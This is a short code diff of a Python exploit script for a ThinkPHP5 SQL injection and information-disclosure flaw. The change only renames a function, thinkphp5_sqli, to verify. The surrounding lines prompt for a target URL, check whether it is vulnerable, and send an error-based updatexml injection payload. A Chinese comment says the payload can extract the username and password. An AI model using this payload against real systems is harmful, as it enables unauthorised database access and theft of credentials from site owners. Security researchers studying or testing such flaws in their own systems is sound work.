@@ -2,7 +2,7 @@ import requests
 import re
 import urllib
 
-def thinkphp5_sqli(url):
+def verify(url):
     relsult = {
         'name': 'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
         'vulnerable': False
@@ -23,7 +23,7 @@ def thinkphp5_sqli(url):
 # 只能爆出用户名密码(不能子查询)
 def exp():
     url = input('输入目标URL:')
-    if thinkphp5_sqli(url):
+    if verify(url):
         print('[+] 存在 ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability')
         payload = url + r'/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
         response = requests.get(payload, timeout=3, verify=False)
